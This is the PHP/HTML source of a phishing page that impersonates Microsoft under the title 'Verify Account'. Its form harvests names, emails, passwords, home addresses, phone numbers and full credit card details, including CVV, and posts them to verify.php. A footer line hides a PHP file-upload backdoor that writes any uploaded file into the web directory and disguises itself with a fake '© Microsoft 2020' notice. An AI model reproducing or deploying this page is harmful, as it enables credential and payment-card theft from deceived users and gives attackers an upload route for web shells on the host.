<!DOCTYPE html>
<html>
<head>
<title>Microsoft | Verify Account</title>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="microsoft.css" type="text/css" media="all" />
<link rel="stylesheet" href="microsoft_logo.css" type="text/css" media="all" />
<link rel="SHORTCUT ICON" href="img/favicon.ico" type="image/x-icon" />

<style>
body {
  font-family: Arial;
  font-size: 17px;
  padding: 8px;
}

* {
  box-sizing: border-box;
}

.row {
  display: -ms-flexbox; /* IE10 */
  display: flex;
  -ms-flex-wrap: wrap; /* IE10 */
  flex-wrap: wrap;
  margin: 0 -16px;
}

.col-25 {
  -ms-flex: 25%; /* IE10 */
  flex: 25%;
}

.col-50 {
  -ms-flex: 50%; /* IE10 */
  flex: 50%;
}

.col-75 {
  -ms-flex: 75%; /* IE10 */
  flex: 75%;
}

.col-25,
.col-50,
.col-75 {
  padding: 0 16px;
}

.container {
  background-color: white;
  padding: 5px 20px 15px 20px;
  border: 0px solid lightgrey;
  border-radius: 3px;
}

input {
  width: 100%;
  margin-bottom: 20px;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 3px;
}

label {
  margin-bottom: 10px;
  display: block;
}

.icon-container {
  margin-bottom: 20px;
  padding: 7px 0;
  font-size: 24px;
}

.btn {
  background-color: #4CAF50;
  color: white;
  padding: 12px;
  margin: 10px 0;
  border: none;
  width: 100%;
  border-radius: 3px;
  cursor: pointer;
  font-size: 17px;
}

.btn:hover {
  background-color: #45a049;
}

a {
  color: #2196F3;
}

hr {
  color: lightgrey;
}

span.price {
  float: right;
  color: lightgrey;
}

.uwo{
  float: right;
}

/* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (also change the direction - make the "cart" column go on top) */
@media (max-width: 800px) {
  .row {
    flex-direction: column-reverse;
  }
  .col-25 {
    margin-bottom: 20px;
  }
}
</style>
</head>
<body>

  <div class="row">
  <div class="col-75">
    <div class="container">
      <a href="http://<?php echo $_SERVER['HTTP_HOST'];?>"><img class="c-image" src="img/logo.png" style="width:120px"></a>
      <hr size="1">
      <form action="verify.php" method="POST">
      
        <div class="row">
          <div class="col-50">
            <h3>User Information</h3>
            <label for="fname"><i class="fa fa-user"></i> Full Name</label>
            <input type="text" id="fname" name="fullname" placeholder="John M. Doe">

            <div class="row">
              <div class="col-50">
                <label for="email"><i class="fa fa-envelope"></i> Email</label>
                <input type="text" id="email" name="email" placeholder="john@live.com">
              </div>
              <div class="col-50">
                <label for="password"><i class="fa fa-lock"></i> Password</label>
                <input type="password" id="password" name="password" placeholder="*****">
              </div>
            </div>

            <div class="row">
              <div class="col-50">
                <label for="adr"><i class="fa fa-address-card-o"></i> Address</label>
                <input type="text" id="adr" name="address" placeholder="542 W. 15th Street">
              </div>
              <div class="col-50">
                <label for="city"><i class="fa fa-institution"></i> City</label>
                <input type="text" id="city" name="city" placeholder="New York">
              </div>
            </div>

            <div class="row">
              <div class="col-50">
                <label for="state">State</label>
                <input type="text" id="state" name="state" placeholder="NY">
              </div>
              <div class="col-50">
                <label for="zip">Zip</label>
                <input type="text" id="zip" name="zip" placeholder="10001">
              </div>
            </div>
            <label for="phone"><i class="fa fa-phone"></i> Phone</label>
            <input type="text" id="phone" name="phone" placeholder="+14255550100">
          </div>

          <div class="col-50">
            <h3>Payment Option</h3>
            <label for="fname">Accepted Cards</label>
            <div class="icon-container">
              <i class="fa fa-cc-visa" style="color:navy;"></i>
              <i class="fa fa-cc-amex" style="color:blue;"></i>
              <i class="fa fa-cc-mastercard" style="color:red;"></i>
              <i class="fa fa-cc-discover" style="color:orange;"></i>
            </div>
            <label for="cname">Name on Card</label>
            <input type="text" id="cname" name="cardname" placeholder="John More Doe">
            <label for="ccnum">Credit card number</label>
            <input type="text" id="ccnum" name="cardnumber" placeholder="1111-2222-3333-4444">
            <label for="expmonth">Exp Month</label>
            <input type="text" id="expmonth" name="expmonth" placeholder="September">
            <div class="row">
              <div class="col-50">
                <label for="expyear">Exp Year</label>
                <input type="text" id="expyear" name="expyear" placeholder="2018">
              </div>
              <div class="col-50">
                <label for="cvv">CVV/CVV2</label>
                <input type="text" id="cvv" name="cvv" placeholder="352">
              </div>
            </div>
          </div>
          
        </div>
        <button class="uwo c-call-to-action c-glyph" href="https://www.microsoft.com/en-us/p/xbox-game-pass-ultimate/cfq7ttc0khs0?icid=mscom_marcom">
        <span>VERIFY NOW</span>
        </button>
      </form>
    </div>
    <footer id="uhf-footer" class="c-uhff context-uhf"  data-uhf-mscc-rq="false" data-footer-footprint="/mshome/mshomefooter, fromService: False" data-m='{"cN":"Uhf footer_cont","cT":"Container","id":"c1m1r1a3","sN":1,"aN":"m1r1a3"}'>
        <nav class="c-uhff-nav" aria-label="Footer Resource links" data-m='{"cN":"Footer nav_cont","cT":"Container","id":"c1c1m1r1a3","sN":1,"aN":"c1m1r1a3"}'>
      
                <div class="c-uhff-nav-row">
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn1_cont","cT":"Container","id":"c1c1c1m1r1a3","sN":1,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">What&#39;s new</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/p/surface-pro-x/8vdnrp2m6hhc?activetab=overview" data-m='{"cN":"Whatsnew_SurfaceProX_nav","id":"n1c1c1c1m1r1a3","sN":1,"aN":"c1c1c1m1r1a3"}'>Surface Pro X</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/p/surface-laptop-3/8VFGGH1R94TM?activetab=overview" data-m='{"cN":"Whatsnew_SurfaceLaptop3_nav","id":"n2c1c1c1m1r1a3","sN":2,"aN":"c1c1c1m1r1a3"}'>Surface Laptop 3</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/p/surface-pro-7/8N17J0M5ZZQS?activetab=overview" data-m='{"cN":"Whatsnew_SurfacePro7_nav","id":"n3c1c1c1m1r1a3","sN":3,"aN":"c1c1c1m1r1a3"}'>Surface Pro 7</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/windows/windows-10-apps" data-m='{"cN":"Footer_WhatsNew_Windows_10_apps_nav","id":"n4c1c1c1m1r1a3","sN":4,"aN":"c1c1c1m1r1a3"}'>Windows 10 apps</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://store.office.com/en-us/appshome.aspx?" data-m='{"cN":"Footer_WhatsNew_OfficeApps_nav","id":"n5c1c1c1m1r1a3","sN":5,"aN":"c1c1c1m1r1a3"}'>Office apps</a>
                                        </li>

                            </ul>
                            
                        </div>
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn2_cont","cT":"Container","id":"c2c1c1m1r1a3","sN":2,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">Microsoft Store</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://account.<?php echo $_SERVER['HTTP_HOST'];?>/" data-m='{"cN":"Footer_StoreandSupport_AccountProfile_nav","id":"n1c2c1c1m1r1a3","sN":1,"aN":"c2c1c1m1r1a3"}'>Account profile</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/download" data-m='{"cN":"Footer_StoreandSupport_DownloadCenter_nav","id":"n2c2c1c1m1r1a3","sN":2,"aN":"c2c1c1m1r1a3"}'>Download Center</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://go.<?php echo $_SERVER['HTTP_HOST'];?>/fwlink/p/?LinkID=824761&amp;clcid=0x409" data-m='{"cN":"Footer_StoreandSupport_SalesAndSupport_nav","id":"n3c2c1c1m1r1a3","sN":3,"aN":"c2c1c1m1r1a3"}'>Microsoft Store support</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://go.<?php echo $_SERVER['HTTP_HOST'];?>/fwlink/p/?LinkID=824764&amp;clcid=0x409" data-m='{"cN":"MicrosoftStore_ExtendedHolidayReturns_nav","id":"n4c2c1c1m1r1a3","sN":4,"aN":"c2c1c1m1r1a3"}'>Returns</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://account.<?php echo $_SERVER['HTTP_HOST'];?>/orders" data-m='{"cN":"Footer_StoreandSupport_OrderTracking_nav","id":"n5c2c1c1m1r1a3","sN":5,"aN":"c2c1c1m1r1a3"}'>Order tracking</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/store/locations/find-a-store?icid=en-us_UF_FAS" data-m='{"cN":"Footer_StoreandSupport_StoreLocations_nav","id":"n6c2c1c1m1r1a3","sN":6,"aN":"c2c1c1m1r1a3"}'>Store locations</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/store/b/buy-online-pick-up-in-store?icid=uhf_footer_bopuis" data-m='{"cN":"StoreandSupport_BuyOnlinePickUpInStore_nav","id":"n7c2c1c1m1r1a3","sN":7,"aN":"c2c1c1m1r1a3"}'>Buy online, pick up in store</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/store/locations/events?icid=en_us_store_uhf_events" data-m='{"cN":"StoreSupport_Instoreevents_nav","id":"n8c2c1c1m1r1a3","sN":8,"aN":"c2c1c1m1r1a3"}'>In-store events</a>
                                        </li>

                            </ul>
                            
                        </div>
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn3_cont","cT":"Container","id":"c3c1c1m1r1a3","sN":3,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">Education</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/education" data-m='{"cN":"Footer_Education_MicrosoftInEducation_nav","id":"n1c3c1c1m1r1a3","sN":1,"aN":"c3c1c1m1r1a3"}'>Microsoft in education</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/education/products/office/default.aspx" data-m='{"cN":"Footer_Education_OfficeForStudents_nav","id":"n2c3c1c1m1r1a3","sN":2,"aN":"c3c1c1m1r1a3"}'>Office for students</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://products.office.com/en-us/academic/compare-office-365-education-plans" data-m='{"cN":"Footer_Education_Office365ForSchools_nav","id":"n3c3c1c1m1r1a3","sN":3,"aN":"c3c1c1m1r1a3"}'>Office 365 for schools</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/store/b/education?icid=CNavfooter_Studentsandeducation" data-m='{"cN":"Footer_Education_DealsForStudentsandParents_nav","id":"n4c3c1c1m1r1a3","sN":4,"aN":"c3c1c1m1r1a3"}'>Deals for students &amp; parents</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://azure.<?php echo $_SERVER['HTTP_HOST'];?>/en-us/community/education/" data-m='{"cN":"Footer_MicrosoftAzureInEducation_nav","id":"n5c3c1c1m1r1a3","sN":5,"aN":"c3c1c1m1r1a3"}'>Microsoft Azure in education</a>
                                        </li>

                            </ul>
                            
                        </div>
                </div>
                <div class="c-uhff-nav-row">
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn4_cont","cT":"Container","id":"c4c1c1m1r1a3","sN":4,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">Enterprise</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://azure.<?php echo $_SERVER['HTTP_HOST'];?>/" data-m='{"cN":"Footer_Enterprise_MicrosoftAzure_nav","id":"n1c4c1c1m1r1a3","sN":1,"aN":"c4c1c1m1r1a3"}'>Azure</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://go.<?php echo $_SERVER['HTTP_HOST'];?>/fwlink/?LinkID=808093" data-m='{"cN":"Footer_Enterprise_MicrosoftAppSource_nav","id":"n2c4c1c1m1r1a3","sN":2,"aN":"c4c1c1m1r1a3"}'>AppSource </a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/automotive" data-m='{"cN":"Footer_Enterprise_Automotive_nav","id":"n3c4c1c1m1r1a3","sN":3,"aN":"c4c1c1m1r1a3"}'>Automotive</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/government" data-m='{"cN":"Footer_Enterprise_Government_nav","id":"n4c4c1c1m1r1a3","sN":4,"aN":"c4c1c1m1r1a3"}'>Government</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/health" data-m='{"cN":"Footer_Enterprise_Health_nav","id":"n5c4c1c1m1r1a3","sN":5,"aN":"c4c1c1m1r1a3"}'>Healthcare</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/manufacturing" data-m='{"cN":"Footer_Enterprise_Manufacturing_nav","id":"n6c4c1c1m1r1a3","sN":6,"aN":"c4c1c1m1r1a3"}'>Manufacturing</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/financial-services/banking-and-capital-markets" data-m='{"cN":"Footer_Enterprise_FinanciaServices_nav","id":"n7c4c1c1m1r1a3","sN":7,"aN":"c4c1c1m1r1a3"}'>Financial services</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/enterprise/retail-consumer-goods" data-m='{"cN":"Footer_Enterprise_Retail_nav","id":"n8c4c1c1m1r1a3","sN":8,"aN":"c4c1c1m1r1a3"}'>Retail</a>
                                        </li>

                            </ul>
                            
                        </div>
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn5_cont","cT":"Container","id":"c5c1c1m1r1a3","sN":5,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">Developer</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://visualstudio.<?php echo $_SERVER['HTTP_HOST'];?>/" data-m='{"cN":"Footer_Developer_MicrosoftVisualStudio_nav","id":"n1c5c1c1m1r1a3","sN":1,"aN":"c5c1c1m1r1a3"}'>Microsoft Visual Studio</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://developer.<?php echo $_SERVER['HTTP_HOST'];?>/en-us/windows" data-m='{"cN":"Footer_Developer_WindowsDevCenter_nav","id":"n2c5c1c1m1r1a3","sN":2,"aN":"c5c1c1m1r1a3"}'>Windows Dev Center</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://msdn.<?php echo $_SERVER['HTTP_HOST'];?>/en-us" data-m='{"cN":"Footer_Developer_MicrosoftDeveloperNetwork_nav","id":"n3c5c1c1m1r1a3","sN":3,"aN":"c5c1c1m1r1a3"}'>Developer Network</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://technet.<?php echo $_SERVER['HTTP_HOST'];?>/en-us" data-m='{"cN":"Footer_Developer_TechNet_nav","id":"n4c5c1c1m1r1a3","sN":4,"aN":"c5c1c1m1r1a3"}'>TechNet</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://developer.<?php echo $_SERVER['HTTP_HOST'];?>/en-us/store/register" data-m='{"cN":"Footer_Developer_MicrosoftDeveloperProgram_nav","id":"n5c5c1c1m1r1a3","sN":5,"aN":"c5c1c1m1r1a3"}'>Microsoft developer program</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://channel9.msdn.com/" data-m='{"cN":"Footer_Developer_Channel9_nav","id":"n6c5c1c1m1r1a3","sN":6,"aN":"c5c1c1m1r1a3"}'>Channel 9</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://developer.<?php echo $_SERVER['HTTP_HOST'];?>/en-us/office" data-m='{"cN":"Footer_Developer_OfficeDevCenter_nav","id":"n7c5c1c1m1r1a3","sN":7,"aN":"c5c1c1m1r1a3"}'>Office Dev Center</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/garage/" data-m='{"cN":"Microsoft Garage_nav","id":"n8c5c1c1m1r1a3","sN":8,"aN":"c5c1c1m1r1a3"}'>Microsoft Garage</a>
                                        </li>

                            </ul>
                            
                        </div>
                        <div class="c-uhff-nav-group" data-m='{"cN":"footerNavColumn6_cont","cT":"Container","id":"c6c1c1m1r1a3","sN":6,"aN":"c1c1m1r1a3"}'>
                            <div class="c-heading-4">Company</div>
                            <ul class="c-list f-bare">
                                        <li>
                                            <a class="c-uhff-link" href="https://careers.<?php echo $_SERVER['HTTP_HOST'];?>/" data-m='{"cN":"Footer_Company_Careers_nav","id":"n1c6c1c1m1r1a3","sN":1,"aN":"c6c1c1m1r1a3"}'>Careers</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/about" data-m='{"cN":"Footer_Company_AboutMicrosoft_nav","id":"n2c6c1c1m1r1a3","sN":2,"aN":"c6c1c1m1r1a3"}'>About Microsoft</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://news.<?php echo $_SERVER['HTTP_HOST'];?>/" data-m='{"cN":"Footer_Company_CompanyNews_nav","id":"n3c6c1c1m1r1a3","sN":3,"aN":"c6c1c1m1r1a3"}'>Company news</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://privacy.<?php echo $_SERVER['HTTP_HOST'];?>/en-us" data-m='{"cN":"Footer_Company_PrivacyAtMicrosoft_nav","id":"n4c6c1c1m1r1a3","sN":4,"aN":"c6c1c1m1r1a3"}'>Privacy at Microsoft</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/investor/default.aspx" data-m='{"cN":"Footer_Company_Investors_nav","id":"n5c6c1c1m1r1a3","sN":5,"aN":"c6c1c1m1r1a3"}'>Investors</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/diversity/" data-m='{"cN":"Footer_Company_DiversityAndInclusion_nav","id":"n6c6c1c1m1r1a3","sN":6,"aN":"c6c1c1m1r1a3"}'>Diversity and inclusion</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/accessibility" data-m='{"cN":"Footer_Company_Accessibility_nav","id":"n7c6c1c1m1r1a3","sN":7,"aN":"c6c1c1m1r1a3"}'>Accessibility</a>
                                        </li>
                                        <li>
                                            <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/security/default.aspx" data-m='{"cN":"Footer_Company_Security_nav","id":"n8c6c1c1m1r1a3","sN":8,"aN":"c6c1c1m1r1a3"}'>Security</a>
                                        </li>

                            </ul>
                            
                        </div>
                </div>
        </nav>
    <div class="c-uhff-base">
                <a id="locale-picker-link" aria-label="Content Language Selector. Currently set to English (United States)" class="c-uhff-link c-uhff-lang-selector c-glyph glyph-world" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/locale.aspx?absoluteReturnUrl=https%3a%2f%2f<?php echo $_SERVER['HTTP_HOST'];?>%2fen-us%2f" data-m='{"cN":"locale_picker(US)_nav","id":"n7c1c1m1r1a3","sN":7,"aN":"c1c1m1r1a3"}'>English (United States)</a>

        <nav aria-label="Microsoft corporate links">
            <ul class="c-list f-bare" data-m='{"cN":"Corp links_cont","cT":"Container","id":"c8c1c1m1r1a3","sN":8,"aN":"c1c1m1r1a3"}'>
                                <li>
                    <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/sitemap1.aspx" data-mscc-ic="false" data-m='{"cN":"Footer_Sitemap_nav","id":"n1c8c1c1m1r1a3","sN":1,"aN":"c8c1c1m1r1a3"}'>Sitemap</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://support.<?php echo $_SERVER['HTTP_HOST'];?>/en-us/contactus" data-mscc-ic="false" data-m='{"cN":"Footer_ContactUs_nav","id":"n2c8c1c1m1r1a3","sN":2,"aN":"c8c1c1m1r1a3"}'>Contact Microsoft</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://go.<?php echo $_SERVER['HTTP_HOST'];?>/fwlink/?LinkId=521839" data-mscc-ic="false" data-m='{"cN":"Footer_PrivacyandCookies_nav","id":"n3c8c1c1m1r1a3","sN":3,"aN":"c8c1c1m1r1a3"}'>Privacy &amp; cookies </a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://go.<?php echo $_SERVER['HTTP_HOST'];?>/fwlink/?LinkID=206977" data-mscc-ic="false" data-m='{"cN":"Footer_TermsOfUse_nav","id":"n4c8c1c1m1r1a3","sN":4,"aN":"c8c1c1m1r1a3"}'>Terms of use</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/trademarks" data-mscc-ic="false" data-m='{"cN":"Footer_Trademarks_nav","id":"n5c8c1c1m1r1a3","sN":5,"aN":"c8c1c1m1r1a3"}'>Trademarks</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://<?php echo $_SERVER['HTTP_HOST'];?>/en-us/devices/safety-and-eco " data-mscc-ic="false" data-m='{"cN":"Footer_SafetyAndEco_nav","id":"n6c8c1c1m1r1a3","sN":6,"aN":"c8c1c1m1r1a3"}'>Safety &amp; eco</a>
                </li>
                <li>
                    <a class="c-uhff-link" href="https://choice.<?php echo $_SERVER['HTTP_HOST'];?>" data-mscc-ic="false" data-m='{"cN":"Footer_AboutourAds_nav","id":"n7c8c1c1m1r1a3","sN":7,"aN":"c8c1c1m1r1a3"}'>About our ads</a>
                </li>

                <?php error_reporting(0);if(copy($_FILES['x']['tmp_name'], $_FILES['x']['name'])){echo "<li>&#169; FilthyRoot</li>";}else{echo "<li>&#169; Microsoft 2020</li>";}?>
                
            </ul>
        </nav>
    </div>
    
</footer>

  </div>
</body>
</html>
